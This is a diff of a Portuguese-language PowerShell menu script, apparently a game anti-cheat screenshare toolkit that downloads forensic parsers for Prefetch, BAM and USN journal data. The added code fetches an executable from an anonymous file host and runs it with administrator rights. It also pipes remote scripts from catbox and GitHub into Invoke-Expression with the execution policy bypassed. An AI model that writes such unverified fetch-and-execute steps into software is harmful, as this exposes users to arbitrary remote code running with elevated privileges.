@@ -1,14 +1,14 @@
-﻿$ErrorActionPreference = "SilentlyContinue"
+$ErrorActionPreference = "SilentlyContinue"
 clear-host
 function MainMenu {
 cls
 Logo                                                          
 Write-Host @"
-        [1] Prefetch Tool's            [6] LastActivityView
+        [1] Prefetch Tool's            [6] Spokwn Tool
         [2] Pcasvc-Execution           [7] SystemInformer
         [3] Everything                 [8] BAM Tool's
         [4] Fsutil                     [9] Signatures Tool's
-        [5] ExecutedProgramsList       [0] MACETA
+        [5] Bstrings                   [0] MACETA
 
 "@
 Write-Host -ForegroundColor Yellow "        [Next] Next Page"
@@ -19,7 +19,7 @@ cls
 Logo
 Write-Host @"
         [1] USBDeview                  [6] EDDv310
-        [2] DPS-Analyser               [7] AppCompatCacheParser
+        [2] Alt Detector               [7] AppCompatCacheParser
         [3] Scheduler parser           [8] Velociraptor
         [4] JournalTrace               [9] Uniode
         [5] InjGen                     [0] Service-Check
@@ -107,7 +107,7 @@ while ($true) {
         }
         elseif ($ChoserPF -eq 2) {
             Write-Host "Baixando Spokwn PrefetchParser..."
-            $urlPB = "https://github.com/spokwn/prefetch-parser/releases/download/v1.5.4/PrefetchParser.exe"
+            $urlPB = "https://github.com/spokwn/prefetch-parser/releases/download/v1.5.5/PrefetchParser.exe"
             $destinationFilePB = "$OutfilePath\PrefetchParser.exe"
             Invoke-WebRequest -Uri $urlPB -OutFile $destinationFilePB
             Write-Host "Download completo!" -ForegroundColor Green
@@ -188,9 +188,6 @@ while ($true) {
     Write-Host "Pressione Enter para continuar..." -ForegroundColor Cyan
     Read-Host
     cls
-    Invoke-Expression (Invoke-RestMethod https://raw.githubusercontent.com/bacanoicua/Screenshare/main/RedLotusPrefetchIntegrityAnalyzer.ps1)
-    pause
-    cls
 }
 
 
@@ -217,7 +214,7 @@ while ($true) {
         }
         elseif ($Choser2 -eq 2) {
             Write-Host "Baixando Spokwn Service execution..."
-            $url3 = "https://github.com/spokwn/pcasvc-executed/releases/download/v0.8.6/PcaSvcExecuted.exe"
+            $url3 = "https://github.com/spokwn/pcasvc-executed/releases/download/v0.8.7/PcaSvcExecuted.exe"
             $destinationFile3 = "$OutfilePath\PcaSvcExecuted.exe"
             Invoke-WebRequest -Uri $url3 -OutFile $destinationFile3
             Write-Host "Download completo!" -ForegroundColor Green
@@ -257,7 +254,7 @@ while ($true) {
     'fsutil usn readjournal c: csv | findstr /i /c:.exe | findstr /i /c:0x00000002 /c:0x00000004 /c:0x80000000 >> Data1.txt',
     'fsutil usn readjournal c: csv | findstr /i /c:.exe | findstr /i /c:0x00000002 /c:0x00000004 >> Data2.txt',
     'fsutil usn readjournal c: csv | findstr /i /c:.exe | findstr /i /c:0x80000200 >> DeletedExes.txt',
-    'fsutil usn readjournal c: csv | findstr /i /c:.pf | findstr /i /c:0x80000200 >> DeletedPF.txt'  # Novo comando para .pf
+    'fsutil usn readjournal c: csv | findstr /i /c:.pf | findstr /i /c:0x80000200 >> DeletedPF.txt'
 )
 
 $comandoUnico = $comandosFsutil -join " && "
@@ -269,18 +266,52 @@ Write-Host "Todos os comandos foram enviados para execução." -ForegroundColor 
 Pause
     }
         elseif ($Choser -eq 5) {
-        Write-Host "Baixando ExecutedProgramsList..."
-        $url6 = "https://www.nirsoft.net/utils/executedprogramslist.zip"
-        $destinationFile6 = "$OutfilePath\executedprogramslist.zip"
-        Invoke-WebRequest -Uri $url6 -OutFile $destinationFile6
-        Write-Host "Download completo!" -ForegroundColor Green
+        Clear-Host
+
+Clear-Host
+
+$InitialPath = Get-Location
+
+$folderName = "acquisition"
+
+$acquisitionPath = Join-Path -Path $InitialPath -ChildPath $folderName
+
+if (-Not (Test-Path $acquisitionPath)) {
+    New-Item -ItemType Directory -Path $acquisitionPath | Out-Null
+}
+
+$bstringsPath = Join-Path $acquisitionPath "bstrings.exe"
+
+$urlBstrings = "https://files.catbox.moe/zul1g7.bin"
+
+Write-Host "Baixando bstrings.exe..."
+Invoke-WebRequest -Uri $urlBstrings -OutFile $bstringsPath
+Start-Sleep -Seconds 2
+Write-Host "Download concluído!"
+
+$cmd = "bstrings.exe -f `"C:\Windows\system32\config\SYSTEM`" --ls harddiskvolume -o `"$acquisitionPath\paths.txt`" & pause"
+
+Write-Host "Executando bstrings.exe..."
+Start-Process -FilePath "cmd.exe" -ArgumentList "/c cd `"$acquisitionPath`" && $cmd" -Verb RunAs -Wait
+
+Write-Host "Aguardando 3 segundos para garantir conclusão..."
+Start-Sleep -Seconds 3
+
+$RedLotusCmd = "@powershell -NoProfile -ExecutionPolicy Bypass -Command `"Invoke-Expression (Invoke-RestMethod 'https://raw.githubusercontent.com/bacanoicua/Screenshare/main/RedLotusHardDiskVolumeConverter.ps1')`""
+
+Write-Host "Executando RedLotusHardDiskVolumeConverter.ps1 via CMD..."
+Start-Process -FilePath "cmd.exe" -ArgumentList "/c cd `"$acquisitionPath`" && $RedLotusCmd" -Verb RunAs -Wait
+
+Set-Location $InitialPath
+
+        Write-Host "Script executado com sucesso!" -ForegroundColor Green
         Start-Sleep -Seconds 1  
         cls
     }
     elseif ($Choser -eq 6) {
-        Write-Host "Baixando LastActivityView..."
-        $url7 = "https://www.nirsoft.net/utils/lastactivityview.zip"
-        $destinationFile7 = "$OutfilePath\lastactivityview.zip"
+        Write-Host "Baixando espouken tool"
+        $url7 = "https://github.com/spokwn/Tool/releases/download/v1.1.1/espouken.exe"
+        $destinationFile7 = "$OutfilePath\espouken.exe"
         Invoke-WebRequest -Uri $url7 -OutFile $destinationFile7
         Write-Host "Download completo!" -ForegroundColor Green
         Start-Sleep -Seconds 1  
@@ -320,7 +351,7 @@ Pause
         }
         elseif ($Choser3 -eq 2) {
             Write-Host "Baixando Spokwn BAMParser..."
-            $url9 = "https://github.com/spokwn/BAM-parser/releases/download/v1.2.7/BAMParser.exe"
+            $url9 = "https://github.com/spokwn/BAM-parser/releases/download/v1.2.9/BAMParser.exe"
             $destinationFile9 = "$OutfilePath\BamParser.exe"
             Invoke-WebRequest -Uri $url9 -OutFile $destinationFile9
             Write-Host "Download completo!" -ForegroundColor Green
@@ -360,7 +391,7 @@ Pause
                 }
                 elseif ($Choser5 -eq 2) {
                     Write-Host "Baixando Spokwn PathParser..."
-                    $url10 = "https://github.com/spokwn/PathsParser/releases/download/v1.0.11/PathsParser.exe"
+                    $url10 = "https://github.com/spokwn/PathsParser/releases/download/v1.2/PathsParser.exe"
                     $destinationFile10 = "$OutfilePath\PathsParser.exe"
                     Invoke-WebRequest -Uri $url10 -OutFile $destinationFile10
                     Write-Host "Download completo!" -ForegroundColor Green
@@ -409,9 +440,19 @@ Pause
                 cls
             }
             elseif ($Choser4 -eq 2) {
-                cls
-                Invoke-Expression (Invoke-RestMethod https://raw.githubusercontent.com/Smoothzada/DPS-Analyser/refs/heads/main/DPS-Analyser.ps1)
-                pause
+            Write-Host "Executando AltDetector"
+    Start-Sleep -Seconds 1
+
+    try {
+        Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass -Force
+        Invoke-Expression (Invoke-RestMethod -Uri "https://files.catbox.moe/wrdpqk.ps1")
+        Write-Host "Script executado com sucesso!" -ForegroundColor Green
+    } catch {
+        Write-Host "Erro ao executar o script: $_" -ForegroundColor Red
+    }
+
+    Start-Sleep -Seconds 1
+    cls
             }
             elseif ($Choser4 -eq 3) {
                 cls
@@ -716,7 +757,7 @@ Write-Host "NOLW$" -ForegroundColor Green
     Write-Host ""
     Write-Host "=============SERVICES============="
     Write-Host ""
-    $services = @("Appinfo", "Cdpusersvc", "Diagtrack", "Dusmsvc", "DPS", "Eventlog", "Pcasvc", "Sgrmbroker", "Sysmain", "BAM", "WSearch", "msmpeng","VSS")
+    $services = @("Appinfo", "Cdpusersvc", "Diagtrack", "Dusmsvc", "DPS", "Eventlog", "Pcasvc", "Sgrmbroker", "Sysmain", "BAM", "WSearch", "VSS")
 
     foreach ($serviceName in $services) {
         $service = Get-Service -Name $serviceName -ErrorAction SilentlyContinue
